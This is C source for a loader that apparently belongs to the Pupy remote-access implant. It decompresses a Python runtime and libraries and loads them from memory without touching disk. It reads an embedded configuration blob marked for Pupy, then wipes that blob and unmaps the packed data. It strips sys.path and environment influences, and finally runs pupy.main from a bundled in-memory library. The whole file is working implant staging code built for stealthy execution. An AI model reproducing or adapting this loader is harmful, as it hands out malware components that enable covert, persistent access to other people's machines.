/* **************** Python-dynload.c **************** */

#include "Python-dynload.h"
#include "Python-dynload-os.h"

typedef struct dependency {
    const char* name;
    const char *bytes;
    size_t size;
    BOOL is_python;
} dependency_t;

struct py_imports py_sym_table[] = {
#include "import-tab.c"
    { NULL, NULL }, /* sentinel */
};

static char __config__[262144] = "####---PUPY_CONFIG_COMES_HERE---####\n";
static PyGILState_STATE restore_state;
static BOOL is_initialized = FALSE;

/* Likely-to-be-used modules */
static const char *preload_modules[] = {
    "__future__",
    "types",
    "linecache",
    "traceback",
    "_weakrefset",
    "abc",
    NULL
};

#include "lzmaunpack.c"
#include "library.c"


static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize, void *arg) {
    HMODULE hModule;
    void *uncompressed = NULL;
    size_t uncompressed_size = 0;

    dprint("Uncompressing %s from %p (size=%d\n)\n", libname, xzbuf, xzsize);

    uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);

    if (!uncompressed) {
        dprint("%s decompression failed\n", libname);
        return NULL;
    }

    dprint("%s decompressed to %p (size=%d)\n", libname, uncompressed, uncompressed_size);

    hModule = MemLoadLibrary(
        libname, (char *) uncompressed, uncompressed_size, arg
    );

#if FREE_HMODULE_AFTER_LOAD
    lzmafree(uncompressed, uncompressed_size);
#endif

    if (!hModule) {
        dprint("loading %s from memory failed\n", libname);
        return NULL;
    }

    return hModule;
}


BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
    HMODULE hPython = NULL;
    PyObject *py_argv = NULL;
    PyObject *py_empty_list = NULL;
    dependency_t dependencies[] = DEPENDENCIES;
    resolve_symbol_t resolver = NULL;
    dependency_t *dependency = NULL;
    struct py_imports *py_sym = NULL;
    int i;

    if (is_initialized) {
        return TRUE;
    }

    for (dependency=dependencies; !hPython; dependency ++) {
        HMODULE hModule = CheckLibraryLoaded(dependency->name);

        if (hModule) {
            if (dependency->is_python) {
                hPython = hModule;
                resolver = OSResolveSymbol;
            }

            continue;
        }

        dprint("Loading %s\n", dependency->name);

        hModule = xz_dynload(
            dependency->name, dependency->bytes, dependency->size, NULL
        );

        dprint("Loaded %s -> %p\n", dependency->name, hModule);

        OSUnmapRegion(dependency->bytes, dependency->size);

        if (!hModule) {
            dprint("%s: load failed\n");
            return FALSE;
        }

        if (dependency->is_python) {
            hPython = hModule;
            resolver = MemResolveSymbol;
        }
    }

    dprint("Loading python from %p\n", hPython);

    for (py_sym = py_sym_table; py_sym->name; py_sym ++) {
        py_sym->proc = (void (*)()) resolver(hPython, py_sym->name);
        if (py_sym->proc == NULL) {
            dprint("undefined symbol %s\n", py_sym->name);
            return FALSE;
        }
    }

    PyEval_InitThreads();
    if(!Py_IsInitialized()) {
        char * ppath = Py_GetPath();
        if (ppath)
            memset(ppath, '\0', strlen(ppath));

        Py_FileSystemDefaultEncoding = FILE_SYSTEM_ENCODING;
        Py_IgnoreEnvironmentFlag = 1;
        Py_NoSiteFlag = 1;
        Py_NoUserSiteDirectory = 1;
        Py_OptimizeFlag = 2;
        Py_DontWriteBytecodeFlag = 1;

        Py_SetProgramName(OSGetProgramName());
        Py_InitializeEx(is_shared_object? 0 : 1);
    }

    restore_state = PyGILState_Ensure();

    py_empty_list = PyList_New(0);
    if (!py_empty_list) {
        dprint("Couldn't allocate list for sys.path\n");
        goto lbExit1;
    }

    PySys_SetObject("path", py_empty_list);

    dprint("SET ARGV (ARGC=%d; SHARED? %d)\n", argc, is_shared_object);

    if (is_shared_object) {
        if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
            argv[1] = argv[0];
            argc -= 1;
            argv += 1;
        } else {
            argc = 1;
        }
    }

    py_argv = PyList_New(0);
    if (!py_argv) {
        dprint("Couldn't allocate list for argv\n");
        goto lbExit1;
    }

    Py_IncRef(py_argv);

    for (i = 0; i<argc && argv[i]; i++) {
        PyList_Append(py_argv, PyString_FromString(argv[i]));
    }

    PySys_SetObject("executable", PyString_FromString(OSGetProgramName()));
    PySys_SetObject("argv", py_argv);

    Py_DecRef(py_argv);

    setup_jvm_class();

    dprint("Python initialized\n");
    return TRUE;

lbExit1:
    return FALSE;
}

static
size_t last_chr_offt(const char *cstr, char chr) {
    int found_any = 0;
    size_t last_found = 0;
    size_t offt;

    for (offt=0; cstr && cstr[offt]; offt++) {
        if (cstr[offt] == chr) {
            found_any = 1;
            last_found = offt;
        }
    }

    if (found_any)
        return last_found;
    else
        return offt;
}

static
PyObject *py_eval_package_init(
    const char *name, PyObject *co_code, const char *vpath, const char *path, int is_package) {

    PyObject *new_module;
    PyObject *new_module_dict;
    PyObject *builtins;
    PyObject *py_eval_result;

    new_module = PyImport_AddModule(name);
    if (!new_module) {
        dprint(
            "py_eval_package_init(%s) - PyImport_AddModule failed\n", name
        );

        return NULL;
    }

    new_module_dict = PyModule_GetDict(new_module);

    PyObject_SetAttrString(
        new_module, "__file__", PyString_FromString(vpath));

    dprint(
        "py_eval_package_init(%s) %p.__file__ = %s\n",
        name, new_module, vpath
    );

    PyObject_SetAttrString(
        new_module, "__package__", PyString_FromString(name));

    dprint(
        "py_eval_package_init(%s) %p.__package__ = %s\n",
        name, new_module, name
    );

    if (is_package) {
        PyObject *py_vpath = PyString_FromStringAndSize(
            vpath, last_chr_offt(vpath, '/'));

        PyObject_SetAttrString(
            new_module, "__path__", Py_BuildValue("[O]", py_vpath));

        Py_DecRef(py_vpath);

        dprint(
            "py_eval_package_init(%s) %p.__path__ = [%s] (refs=%d)\n",
            name, new_module, PyString_AsString(py_vpath), Py_RefCnt(py_vpath)
        );
    }

    builtins = PyEval_GetBuiltins();
    Py_IncRef(builtins);
    PyDict_SetItemString(new_module_dict, "__builtins__", builtins);

    dprint(
        "py_eval_package_init(%s) %p.__dict__['__builtins__'] = %p (refcnt=%d)\n",
        name, new_module, builtins, Py_RefCnt(builtins)
    );

    py_eval_result = PyEval_EvalCode(
        co_code, new_module_dict, new_module_dict);

    if (!py_eval_result) {
        // FIXME: Delete from sys.modules (?)
        return NULL;
    }

    Py_DecRef(py_eval_result);

    dprint(
        "py_eval_package_init(%s) -> builtins %p (refcnt=%d)\n",
        name, builtins, Py_RefCnt(builtins)
    );

    dprint(
        "py_eval_package_init(%s) -> %p (refcnt=%d) __dict__ %p (refcnt=%d) co_code %p (refcnt=%d)\n",
        name,
        new_module, Py_RefCnt(new_module),
        new_module_dict, Py_RefCnt(new_module_dict),
        co_code, Py_RefCnt(co_code)
    );

    return new_module;
}

static
PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init) {
    PyObject *module = NULL;
    PyObject *pybody = NULL;
    PyObject *pybytecode = NULL;

    char *pybody_c_ptr = NULL;
    Py_ssize_t pybody_c_size = 0;

    char *vpath_name = NULL;
    char *path_name = NULL;

    // pupy:// name /__init__.pyo
    // OR
    // pupy:// name .pyo

    size_t vpath_len =
        strlen(name)
        + sizeof(VPATH_EXT) - 1
        + sizeof(VPATH_PREFIX) - 1
        + (is_init? sizeof("/__init__") - 1: 0)
        + 1
        ;

    vpath_name = (char *) OSAlloc(vpath_len);
    if (!vpath_name)
        goto lbMemFailure1;

    memset(vpath_name, '\0', vpath_len);
    strcpy(vpath_name, VPATH_PREFIX);
    strcat(vpath_name, name);
    if (is_init)
        strcat(vpath_name, "/__init__" VPATH_EXT);
    else
        strcat(vpath_name, VPATH_EXT);

    // same string without pupy://
    path_name = vpath_name + sizeof(VPATH_PREFIX) - 1;

    pybody = PyDict_GetItemString(py_stdlib, path_name);
    if (!pybody) {
        dprint(
            "py_module_from_library(%s, %d) -> %s (%s) not found in stdlib\n",
            name, is_init, path_name, vpath_name
        );

        PyErr_SetString(PyExc_ImportError, name);
        goto lbFreeVpath;
    }

    dprint(
        "py_module_from_library(%s, %d) -> %s found -> %p\n",
        name, is_init, path_name, pybody
    );

    if (PyString_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
        dprint(
            "py_module_from_library(%s, %d) -> %s -> Invalid type?\n",
            name, is_init, path_name
        );

        goto lbFreeVpath;
    }

    dprint(
        "py_module_from_library(%s, %d) -> %s (%p) -> bytecode=%p size=%d\n",
        name, is_init, path_name, pybody,
        pybody_c_ptr, pybody_c_size
    );

    pybytecode = PyMarshal_ReadObjectFromString(
        pybody_c_ptr + 8, pybody_c_size - 8
    );

    if (!pybytecode) {
        dprint(
            "py_module_from_library(%s, %d) -> %s -> Invalid type (marshall error)?\n",
            name, is_init, path_name
        );

        goto lbFreeVpath;
    }

    dprint(
        "py_module_from_library(%s, %d) -> %s (%p) -> bytecode=%p size=%d -> Unmarshalled -> %p\n",
        name, is_init, path_name, pybody,
        pybody_c_ptr, pybody_c_size,
        pybytecode
    );

    // It's worth to continue
    module = py_eval_package_init(name, pybytecode, vpath_name, path_name, is_init);
    if (!module) {
        dprint("py_module_from_library(%s, %d) -> Eval failed\n", name, is_init);
        PyErr_Print();
        goto lbFreePyBytecode;
    }

    dprint("py_module_from_library(%s, %d) -> %p\n", name, is_init, module);

    PyDict_DelItemString(py_stdlib, path_name);

lbFreePyBytecode:
    Py_DecRef(pybytecode);

lbFreeVpath:
    OSFree(vpath_name);

    return module;

lbMemFailure1:
    return PyErr_NoMemory();
}


void run_pupy() {
    union {
        unsigned int l;
        unsigned char c[4];
    } len;

    PyObject *pupy;
    PyObject *future;

    PyObject *py_config_list;
    PyObject *py_pupylib;
    PyObject *py_stdlib;
    PyObject *pupy_dict;
    PyObject *py_debug;
    PyObject *py_main;
    PyObject *py_eval_result;
    PyObject *py_config = NULL;

    const char **preload_module = NULL;

    dprint("Load config\n");
    len.c[3] = __config__[0];
    len.c[2] = __config__[1];
    len.c[1] = __config__[2];
    len.c[0] = __config__[3];

    if (len.l == 0x23232323) {
        dprint("Config not found\n");
        goto lbExit1;
    }

    dprint("Config size: %d\n", len.l);

    py_config_list = PyObject_lzmaunpack(__config__+4, len.l);
    dprint("Config parcel unpacked: %p\n", py_config_list);
    if (!py_config_list) {
        dprint("Config unpack failed\n");
        goto lbExit1;
    }

    dprint("Cleanup config\n");
    memset(__config__, 0xFF, len.l + 4);

    dprint("Stdlib size: %d\n", library_c_size);
    py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
    if (!py_stdlib) {
        goto lbExit2;
    }

    dprint("Stdlib unpacked: %p\n", py_stdlib);

    dprint("Unmap stdlib..\n");
    OSUnmapRegion(library_c_start, library_c_size);
    OSUnmapRegion(__config__, len.l);
    dprint("Unmap stdlib.. done\n");

    py_config = PyList_GetItem(py_config_list, 0);
    dprint("Get config: %p\n", py_config);

    py_pupylib = PyList_GetItem(py_config_list, 1);
    dprint("Get pupy: %p\n", py_pupylib);

    dprint("Update stdlib\n");
    PyDict_Update(py_stdlib, py_pupylib);

    Py_IncRef(py_config);

    dprint("Preload basic modules\n");
    for (preload_module=preload_modules; *preload_module; preload_module ++) {
        if (!py_module_from_stdlib(py_stdlib, *preload_module, 0))
            goto lbExit4;
    }

    dprint("Loading pupy\n");
    pupy = py_module_from_stdlib(py_stdlib, "pupy", 1);
    if (!pupy)
        goto lbExit4;

    pupy_dict = PyModule_GetDict(pupy);
    py_main = PyDict_GetItemString(pupy_dict, "main");

    if (!py_main) {
        dprint("pupy.main not found\n");
        goto lbExit3;
    }

#ifdef DEBUG
    py_debug = PyBool_FromLong(1);
#else
    py_debug = PyBool_FromLong(0);
#endif

    dprint(
        "Call pupy.main: %p(%p, %p, %p)\n",
        py_main, Py_None, py_debug, py_config
    );

    Py_IncRef(py_main);
    Py_IncRef(Py_None);

    py_eval_result = PyObject_CallFunctionObjArgs(
        py_main, Py_None, py_debug, py_config, py_stdlib, NULL);

    if (!py_eval_result) {
        PyErr_Print();
    } else {
        Py_DecRef(py_eval_result);
    }

    Py_DecRef(py_main);
    Py_DecRef(Py_None);

    dprint("Completed (py_eval_result: %p)\n", py_eval_result);

lbExit4:
    Py_DecRef(py_config);

lbExit3:
    Py_DecRef(py_config_list);

lbExit2:
    Py_DecRef(py_stdlib);

lbExit1:
    dprint("Exit\n");
}

void deinitialize_python() {
    dprint("Deinitialize python\n");
    PyGILState_Release(restore_state);
    Py_Finalize();
}

int Py_RefCnt(const PyObject *object) {
    if (!object)
        return -1;

    return *((int *) object);
}
